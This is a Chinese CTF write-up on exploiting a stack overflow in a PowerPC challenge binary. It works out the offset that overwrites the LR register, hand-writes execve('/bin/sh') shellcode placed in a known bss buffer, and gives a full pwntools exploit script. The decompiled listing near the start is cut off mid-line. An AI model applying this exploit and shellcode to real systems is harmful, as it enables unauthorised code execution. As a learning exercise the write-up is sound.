ida7.0没有PowerPC的反汇编功能，直接看汇编还是有点吃力，可以试一下前段时间发布的Ghidra。搜索main函数，可以看到Ghidra的反汇编功能非常强大。
    void main(void)
    {
      size_t sVar1;
      size_t __edflag;
      int local_20;
                        /* local function entry for global function main at 10000a78 */
      welcome();
      get_input();
      sVar1 = .strlen(buf);
      local_20 = 0;
      while (local_20     addi   r1, r31, 0xf0
       0x10000c70     ld     r0, 0x10(r1)
    ►  0x10000c74     mtlr   r0
       0x10000c78     ld     r31, -8(r1)
       0x10000c7c     blr
同时查看栈，查找我们输入的一大串'0xaaaaaaaaaa'
    pwndbg> stack 100
    00:0000│ r31 sp  0x40007fff50 —▸ 0x4000800040 ◂— 0x0
    01:0008│         0x40007fff58 ◂— 0x0
    02:0010│         0x40007fff60 —▸ 0x10000c64 (encrypt+176) ◂— nop
    03:0018│         0x40007fff68 ◂— 0x0
    04:0020│         0x40007fff70 ◂— 0x1c
    05:0028│         0x40007fff78 ◂— 0x0
    06:0030│         0x40007fff80 ◂— 0x1
    07:0038│         0x40007fff88 ◂— 0x20 /* ' ' */
    08:0040│         0x40007fff90 —▸ 0x1009edfb ◂— 0x746e450000000000
    09:0048│         0x40007fff98 ◂— 0x0
    ... ↓
    0b:0058│         0x40007fffa8 —▸ 0x40007fffb0 ◂— 0x32 /* '2' */
    0c:0060│         0x40007fffb0 ◂— 0x32 /* '2' */
    0d:0068│         0x40007fffb8 ◂— 0xaaaaaaaaaaaaaaaa  # 输入的内容
    ... ↓
    10:0080│         0x40007fffd0 ◂— 0xc1aaaaaa
    11:0088│         0x40007fffd8 ◂— 0x0
那么`LR`的偏移为`0xf0+0x10-0x68=152`，只要填充152字节就可以覆盖`LR`。
当然，也可以用最粗暴的报错方法进行爆破溢出长度，原理跟x86的类似，输入一串超长的字符串，通过报错时观察`LR`的值，确定溢出长度
    # kira @ k1r4 in ~/pwn/utctf on git:master x [9:22:41]
    $ python -c "print ('a'*152)"|./ppc
    This is the UT encryption service.
    We take your strings and make them into other strings!
    Enter a string
    153
    Here's your string: aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa
    Invalid data memory access: 0x00000000000000c0
    NIP 00000000000000c0   LR 00000000000000c1 CTR 0000000010014870 XER 0000000020000000 CPU#0
    MSR 8000000002806001 HID0 0000000000000000  HF 8000000002806001 idx 0
    # kira @ k1r4 in ~/pwn/utctf on git:master x [9:22:58] C:139
    $ python -c "print ('a'*160)"|./ppc
    This is the UT encryption service.
    We take your strings and make them into other strings!
    Enter a string
    161
    Here's your string: aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa
    Invalid data memory access: 0x0000000000000000
    NIP aaaaaaaaaaaaaaa8   LR aaaaaaaaaaaaaaaa CTR 0000000010014870 XER 0000000020000000 CPU#0
    MSR 8000000002806001 HID0 0000000000000000  HF 8000000002806001 idx 0
留意`LR`的报错信息，当输入长度152时（请无视那个换行符），`LR`未被覆盖，而输入长度160时，`LR`已经被我们输入覆盖了。那么可以确定溢出长度为152。
  * 下一步，我们需要寻找一个可控的内存段存放shellcode，而且地址必须可知。
这一步没花太多时间，因为在程序唯一一次读取输入的地方，可以发现存放输入的`buf`是一个bss段的全局变量，程序没开PIE，地址可知。
    .bss:00000000100D2B40                 .globl buf_0
    .bss:00000000100D2B40 buf_0:          .space 1                # DATA XREF: main_0+20↑o
    .bss:00000000100D2B40                                         # main_0+44↑o ...
  * 现在可以开始进行shellcode编写
ppc的shellcode跟x86没什么差别，最终目标一样是`execve("/bin/sh", 0, 0)`，构造条件如下：
  1. `r0`为syscall调用号，需要设为`0xb`
  2. `r3`为参数一，需要指向`/bin/sh`
  3. `r4`为参数二，需清0
  4. `r5`为参数三，需清0
  5. 在ppc中syscall使用`sc`
shellcode编写需要上面提到的各种指令集，不停查阅后终于写出shellcode，最终写出的shellcode如下：
    xor 3,3,3
    lis 3, 0x100d
    addi 3, 3, 0x2b64
    xor 4,4,4
    xor 5,5,5
    li 0, 11
    sc
    .long 0x6e69622f
    .long 0x68732f
为了绕过异或，我直接在payload前面加了8字节的\x00，因此后面用的各种地址都需要+8。
完整exp：
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    context.log_level = 'DEBUG'
    target = 'ppc'
    p = process('./'+target)
    shellcode = asm("""
    xor 3,3,3   
    lis 3, 0x100d  
    addi 3, 3, 0x2b64
    xor 4,4,4
    xor 5,5,5
    li 0, 11
    sc
    .long 0x6e69622f
    .long 0x68732f
    """)
    rop = p64(0) + shellcode
    rop = rop.ljust(152,'A')
    rop += p64(0x100D2B40+8)
    p.sendlineafter('string\n',rop)
    p.interactive()
## 总结
虽然是最简单的栈溢出+shellcode编写，不过由于PowerPC接触太少，还是花了好多时间进行资料收集和研究，最终做出来也对PowerPC熟悉了不少。
## 参考